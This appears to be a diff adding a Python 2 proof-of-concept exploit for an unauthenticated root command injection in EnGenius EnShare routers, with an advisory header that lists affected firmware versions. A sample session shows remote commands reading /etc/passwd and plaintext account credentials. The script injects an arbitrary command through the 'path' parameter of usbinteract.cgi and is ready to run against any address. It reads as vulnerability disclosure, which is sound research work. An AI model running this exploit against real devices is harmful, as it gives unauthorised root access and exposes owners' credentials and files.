@@ -1,0 +1,127 @@
+#!/usr/bin/env python
+# coding: utf8
+#
+#
+# EnGenius EnShare IoT Gigabit Cloud Service 1.4.11 Root Remote Code Execution
+#
+#
+# Vendor: EnGenius Technologies Inc.
+# Product web page: https://www.engeniustech.com
+# Affected version: ESR300  (1.4.9, 1.4.7, 1.4.2, 1.4.1.28, 1.4.0, 1.3.1.42, 1.1.0.28)
+#                   ESR350  (1.4.11, 1.4.9, 1.4.5, 1.4.2, 1.4.0, 1.3.1.41, 1.1.0.29)
+#                   ESR600  (1.4.11, 1.4.9, 1.4.5, 1.4.3, 1.4.2, 1.4.1, 1.4.0.23, 1.3.1.63, 1.2.1.46, 1.1.0.50)
+#                   EPG5000 (1.3.9.21, 1.3.7.20, 1.3.3.17, 1.3.3, 1.3.2, 1.3.0, 1.2.0)
+#                   ESR900  (1.4.5, 1.4.3, 1.4.0, 1.3.5.18 build-12032015@liwei (5668b74), 1.3.1.26, 1.3.0, 1.2.2.23, 1.1.0)
+#                   ESR1200 (1.4.5, 1.4.3, 1.4.1, 1.3.1.34, 1.1.0)
+#                   ESR1750 (1.4.5, 1.4.3, 1.4.1, 1.4.0, 1.3.1.34, 1.3.0, 1.2.2.27, 1.1.0)
+#
+# Summary: With the EnGenius IoT Gigabit Routers and free EnShare app, use
+# your iPhone, iPad or Android-based tablet or smartphone to transfer
+# video, music and other files to and from a router-attached USB hard
+# drive. Enshare is a USB media storage sharing application that enables
+# access to files remotely. The EnShare feature allows you to access media
+# content stored on a USB hard drive connected to the router's USB port in
+# the home and when you are away from home when you have access to the Internet.
+# By default the EnShare feature is enabled.
+#
+# EnShareTM supports both FAT32 and NTFS USB formats. Transfer speeds of data
+# from your router-attached USB storage device to a remote/mobile device may
+# vary based on Internet uplink and downlink speeds. The router's design enables
+# users to connect numerous wired and wireless devices to it and supports intensive
+# applications like streaming HD video and sharing of media in the home and accessing
+# media away from the home with EnShare - Your Personal Media Cloud.
+#
+# Desc: EnGenius EnShare suffers from an unauthenticated command injection
+# vulnerability. An attacker can inject and execute arbitrary code as the
+# root user via the 'path' GET/POST parameter parsed by 'usbinteract.cgi'
+# script.
+#
+# =======================================================================
+#
+# bash-4.4$ python enshare.py 10.0.0.17
+# [+] Command: ls -alsh
+#   44 -rwxr-xr-x    1 0        0           42.5K Oct 31  2014 getsize.cgi
+#    4 -rwxr-xr-x    1 0        0             606 Oct 31  2014 languageinfo.cgi
+#   48 -rwxr-xr-x    1 0        0           44.2K Oct 31  2014 upload.cgi
+#   48 -rwxr-xr-x    1 0        0           44.5K Oct 31  2014 usbinfo.cgi
+#   56 -rwxr-xr-x    1 0        0           54.1K Oct 31  2014 usbinteract.cgi
+#    0 drwxr-xr-x    4 0        0               0 Jun  3 00:52 ..
+#    0 drwxr-xr-x    2 0        0               0 Oct 31  2014 .
+#
+# [+] Command: id
+# uid=0(root) gid=0(root)
+#
+# [+] Command: cat /etc/passwd
+#
+# Connecting to 10.0.0.17 port 9000
+#
+# HTTP/1.1 200 OK
+# root: !:0:0:root:/root:/bin/sh
+# administrator: *:65534:65534:administrator:/var:/bin/false
+# admin: *:60000:60000:webaccount:/home:/usr/bin/sh
+# guest: *:60001:60000:webaccount:/home:/usr/bin/sh
+# Content-type: text/html
+# Transfer-Encoding: chunked
+# Date: Sat, 03 Jun 2017 13:48:14 GMT
+# Server: lighttpd/1.4.31
+#
+# 0
+# [+] Command: pwd
+# /www/web/cgi-bin
+# [+] Command: cat /etc/account.conf
+#
+# HTTP/1.1 200 OK
+# 1: admin:admin:4
+# 1: guest:guest:1
+# Content-type: text/html
+# Transfer-Encoding: chunked
+# Date: Sat, 03 Jun 2017 14:53:42 GMT
+# Server: lighttpd/1.4.31
+# bash-4.4$ 
+#
+# =======================================================================
+#
+# Tested on: Linux 2.6.36 (mips)
+#            Embedded HTTP Server ,Firmware Version 5.11
+#            lighttpd/1.4.31
+#
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+#                             @zeroscience
+#
+#
+# Advisory ID: ZSL-2017-5413
+# Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5413.php
+#
+#
+# 17.05.2017
+#
+
+
+import sys, socket
+
+if len(sys.argv) < 2:
+    print 'Usage: enshare.py <ip> [port]\n'
+    quit()
+
+ip = sys.argv[1]
+port = 9000 if len(sys.argv) < 3 else int(sys.argv[2])
+cmd = raw_input('[+] Command: ')
+
+payload  = 'POST /web/cgi-bin/usbinteract.cgi HTTP/1.1\r\n'
+payload += 'Host: {0}:{1}\r\n'
+payload += 'Content-Length: {2}\r\n'
+payload += 'Content-Type: application/x-www-form-urlencoded\r\n\r\n'
+payload += 'action=7&path=\"|{3}||\"'
+
+msg = payload.format( ip, port, len(cmd)+19, cmd )
+  
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+target = (ip, port)
+print >>sys.stderr, '\nConnecting to %s port %s\n' % target
+s.connect(target)
+s.sendall(msg)
+response = s.recv(5000)
+s.close()
+
+print response.strip()
